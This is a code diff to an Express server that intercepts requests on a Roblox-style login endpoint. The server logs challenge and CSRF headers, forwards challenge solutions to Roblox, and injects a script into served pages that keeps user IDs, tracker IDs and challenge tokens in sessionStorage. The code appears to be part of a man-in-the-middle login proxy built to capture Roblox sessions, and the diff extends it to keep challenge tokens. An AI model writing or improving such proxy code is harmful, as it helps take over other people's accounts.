@@ -255,7 +255,10 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     console.log('   All incoming headers:');
     for (const [k, v] of Object.entries(req.headers)) {
         if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx') || k.includes('rblx')) {
-            console.log(`     ${k}: ${typeof v === 'string' ? v.substring(0, 100) : v}`);
+            const displayValue = typeof v === 'string' 
+                ? (v.length > 100 ? v.substring(0, 100) + '...' : v)
+                : v;
+            console.log(`     ${k}: ${displayValue}`);
         }
     }
     
@@ -270,28 +273,8 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
         }
     }
 
-    const challengeHeaders = {};
-    for (const h of CHALLENGE_HEADERS) {
-        if (req.headers[h]) challengeHeaders[h] = req.headers[h].substring(0, 50) + '...';
-    }
-    if (Object.keys(challengeHeaders).length > 0) {
-        console.log('   Challenge headers summary:', challengeHeaders);
-    }
-
     try {
         const bodyStr = req.body.toString('utf8');
-
-        if (req.path === '/auth-api/v2/login') {
-            const relevantHeaders = {};
-            for (const [k, v] of Object.entries(req.headers)) {
-                if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx')) {
-                    relevantHeaders[k] = typeof v === 'string' ? v.substring(0, 50) : v;
-                }
-            }
-            if (Object.keys(relevantHeaders).length > 0) {
-                console.log('   Incoming headers:', relevantHeaders);
-            }
-        }
 
         if (hasChallengeSolution) {
             console.log('   Forwarding challenge solution to Roblox...');
@@ -474,6 +457,7 @@ function buildInjectedScript(host) {
     window.__rblxUserId = sessionStorage.getItem('__rblxUserId') || null;
     window.__rblxBrowserTrackerId = sessionStorage.getItem('__rblxBrowserTrackerId') || null;
     window.__rblxChallengeSolved = sessionStorage.getItem('__rblxChallengeSolved') === 'true';
+    window.__rblxChallengeToken = sessionStorage.getItem('__rblxChallengeToken') || null;
     
     if (window.__rblxChallengeId) {
         log('Restored challenge state from sessionStorage', {
@@ -491,6 +475,7 @@ function buildInjectedScript(host) {
         if (window.__rblxChallengeType) sessionStorage.setItem('__rblxChallengeType', window.__rblxChallengeType);
         if (window.__rblxUserId) sessionStorage.setItem('__rblxUserId', window.__rblxUserId);
         if (window.__rblxBrowserTrackerId) sessionStorage.setItem('__rblxBrowserTrackerId', window.__rblxBrowserTrackerId);
+        if (window.__rblxChallengeToken) sessionStorage.setItem('__rblxChallengeToken', window.__rblxChallengeToken);
         sessionStorage.setItem('__rblxChallengeSolved', window.__rblxChallengeSolved ? 'true' : 'false');
     }
 
